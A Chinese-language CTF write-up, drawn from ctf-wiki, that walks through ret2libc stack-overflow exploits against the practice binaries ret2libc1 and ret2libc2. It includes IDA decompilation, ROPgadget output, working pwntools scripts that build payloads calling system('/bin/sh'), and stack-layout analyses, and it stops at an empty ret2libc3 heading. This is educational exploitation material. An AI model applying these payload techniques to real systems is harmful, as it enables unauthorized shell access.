# ret2libc

> 出自 https://github.com/ctf-wiki/ctf-wiki 中的Pwn: Linux Pwn: 栈溢出: 基本ROP
>
> writer: github.com/hex-16   data: 2021.3   contact: hexhex16@outlook.com
>
> file: ret2libc1, ret2libc2, ret2libc3     (download from https://github.com/ctf-wiki/ctf-wiki)
>
> 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别
>
> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html    

- 由简单到难分别给出三个例子

# ret2libc1

> file: ret2libc1

- 目标：控制程序执行`system("/bin/sh")`

- 思路：找到程序的`"/bin/sh"`和`system`的地址，控制程序执行`system`，并构造`system`函数的栈帧

- `system`函数有一个致命的缺陷就是：有时候我们并不能利用它成功获取root权限。

  因为system函数本质上就是通过fork一个子进程，然后该子进程通过系统自带的sh执行system的命令。而在某些系统中，在启动新进程执行sh命令的时候会将它的特权给剔除掉(如果/bin/sh指向zsh，则不会进行权限降低；如果/bin/sh指向bash则会进行权限降低)，这样我们system就无法获取root权限了。

  为了解决这个问题，高手们又研发了一种更高级的攻击技术——基于libc的函数调用链攻击(https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html)

```bash
checksec --file=ret2libc1
RELRO         STACK CANARY    NX          PIE      RPATH     RUNPATH     Symbols      FORTIFY Fortified    Fortifiable   FILE
Partial RELRO No canary found NX enabled  No PIE   No RPATH  No RUNPATH  84) Symbols    No    0            1             ret2libc1
```

- IDA main函数：

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets(s); // 溢出点
  return 0;
}
```



## ROPgadget

- 利用 `ropgadget`，查看是否有 `/bin/sh` 存在

```bash
$ ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048720 : /bin/sh
```



## IDA: Find function "system"

- 再次查找一下是否有 `system` 函数存在

```assembly
# 找到system函数：
extern:0804A0F4 ; int system(const char *command)
extern:0804A0F4                 extrn system:near       ; CODE XREF: _system↑j # 双击这个可以直接跳到代码段里面引用到的地方
extern:0804A0F4                                         ; DATA XREF: .got.plt:off_804A018↑o # 双击这个引用
# 然后可以在 .got.plt 段看到引用
.got.plt:0804A018 off_804A018     dd offset system        ; DATA XREF: _system↑r # 双击这个引用
# 在 .plt 找到使用的地方
.plt:08048460 ; =============== S U B R O U T I N E =======================================
.plt:08048460 ; Attributes: thunk
.plt:08048460 ; int system(const char *command)
.plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p
.plt:08048460
.plt:08048460 command         = dword ptr  4
.plt:08048460
.plt:08048460                 jmp     ds:off_804A018 # 这里就是调用了system函数的地方
.plt:08048460 _system         endp
.plt:08048460
```



## Exploit

```python
#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')

binsh_addr = 0x08048720 # 0x08048720 : /bin/sh 字符串所在的地址
system_plt = 0x08048460 # .plt:08048460  jmp     ds:off_804A018 # plt表，存放调用system函数的额外代码串的表
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr]) # 112是可供溢出字符串与返回地址的偏移量，分析方法与其他ROP问题相同
# 程序的RA覆盖为 system_plt，执行system()函数，'bbbb' 为system函数的虚假返回地址
sh.sendline(payload)
sh.interactive()
```

- 需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容

### Payload Analysis

```assembly
; High Address 高地址 ; main函数的栈被payload覆盖之后如下 ;payload.hex()
20870408 ; 0x08048720 binsh_addr "/bin/sh" 字符串所在的地址
62626262 ; 'bbbb'
60840408 ; 执行 ret(pop EIP); EIP被更改为 system_plt 即system函数的地址; 执行完后EBP, ESP指向此处
61616161 ; 'aaaa' ; 在ret前，ESP会被恢复为指向EBP，即"删"掉当前函数使用的栈
...
; Low Address 低地址
```

- `system_plt`是`system`函数的调用地址（实际为PLT表中调用`system`函数的代码片段的地址），即为正常从头调用system函数，而不是从system函数中间的指令开始
- 在`ret(pop EIP)`到`system`之后，`system`开始执行时，EBP指向的是`60840408`，对于`system`函数来说，EBP+4: `62626262`就是`system`的返回地址，EBP+8: `20870408 (0x08048720)`就是`system`的第一个参数。因此完成目标：调用`system("/bin/sh")`

# ret2libc2

> file: ret2libc2

- 解题思路：利用gets函数，再调用一次gets，读入`/bin/sh`(payload以外的sendline)，利用`pop Ereg; ret;`抬栈，然后执行`system("/bin/sh")`

```bash
$ checksec --file=ret2libc2
RELRO         STACK CANARY    NX         PIE     RPATH    RUNPATH     Symbols     FORTIFY Fortified  Fortifiable  FILE
Partial RELRO No canary found NX enabled No PIE  No RPATH No RUNPATH  84) Symbols   No    0          2            ret2libc2
```



## IDA Analysis

IDA逆向后的main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets(s);
  return 0;
}
```

- gets函数的plt代码片段（即一条jmp指令）

```assembly
.plt:08048460 ; =============== S U B R O U T I N E =======================================
.plt:08048460 ; Attributes: thunk
.plt:08048460 ; char *gets(char *s)
.plt:08048460 _gets           proc near               ; CODE XREF: main+72↓p
.plt:08048460
.plt:08048460 gets_val        = dword ptr  4
.plt:08048460
.plt:08048460                 jmp     ds:off_804A010    ; 调用libc的函数gets的代码片段
.plt:08048460 _gets           endp
.plt:08048460
```



## ROPgadget

- 找得到`system`，但找不到`/bin/sh`

```bash
ROPgadget --binary ret2libc2 --string 'system'
Strings information
============================================================
0x0804831a : system
$ ROPgadget --binary ret2libc2 --string '/bin/sh'
Strings information
============================================================
```

- `pop ebx ; ret` gadget:

```bash
$ ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx' 
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```
- `ROPgadget --binary ret2libc2 --only 'pop|ret'`: `'pop|ret'` gadget

```bash
$ ROPgadget --binary ret2libc2 --only 'pop|ret'
Gadgets information
============================================================
0x0804872f : pop ebp ; ret
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
0x0804872e : pop edi ; pop ebp ; ret
0x0804872d : pop esi ; pop edi ; pop ebp ; ret
0x08048426 : ret
0x0804857e : ret 0xeac1

Unique gadgets found: 7
```



## Exploit

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')
context.log_level = "DEBUG"
gets_plt = 0x08048460  # .plt:08048460  jmp ds:off_804A010 # char *gets(char *s)
system_plt = 0x08048490  # .plt:08048490  jmp ds:off_804A01C # int system(const char *command)
pop_ebx = 0x0804843d # 用于抬栈，使得调用完gets后调用system
buf2 = 0x0804a080 # 在bbs段的没有引用的 char buf2[100]
payload = flat(['a' * (0x6c + 4), gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh') # 读取到buf2的字符串
sh.interactive()
```

### Payload Analysis

此处对`pop_ebx`的解释为鄙人的推测，暂未验证。捋逻辑时从下往上看

```assembly
; High Address 高地址 ; main函数的栈被payload覆盖之后如下  ;payload.hex()
0804a080 ; buf2的地址，是system函数的第一个参数
deadbeef ; 0xdeadbeef system函数的虚假返回地址
08048490 ; system_plt; plt表中system函数的代码片段; 执行pop_ebx的ret时pop EIP用的是08048490, 即跳转到了system_plt
0804a080 ; buf2的地址; gets的第一个参数，即gets读取到的字符串被存储在buf2中
0804843d ; pop_ebx; gets的返回地址RA; 执行完gets之后，执行pop_ebx指向的pop ebx(buf2); ret(pop EIP); ESP抬了2次，指向system_plt
08048460 ; gets_plt; 原本的RA，执行ret(pop EIP)时 ESP 指向此处，故EIP被更改为gets_plt; 然后调用gets，pop_ebx为RA，buf2为第一个参数
61616161 ; 'aaaa'
...
; Low Address 低地址
```

`pop_ebx`处的作用为将ESP抬至`system_plt`使得能够pop `08048490` 给EIP，即让EIP指向`system_plt`，控制程序执行`system`函数。也就是说，`pop ebx; ret`里的ebx没有实际意义，gets和system函数均未使用ebp寄存器来传递参数（而是用栈），换成其他不会影响后续程序的寄存器均可。但是由前面`ROPgadget --binary ret2libc2 --only 'pop|ret'`的输出可知，`pop Ereg; ret`模式的只有`0x0804843d`一处，而当前问题恰需抬栈2次(2x4bytes)。

# ret2libc3

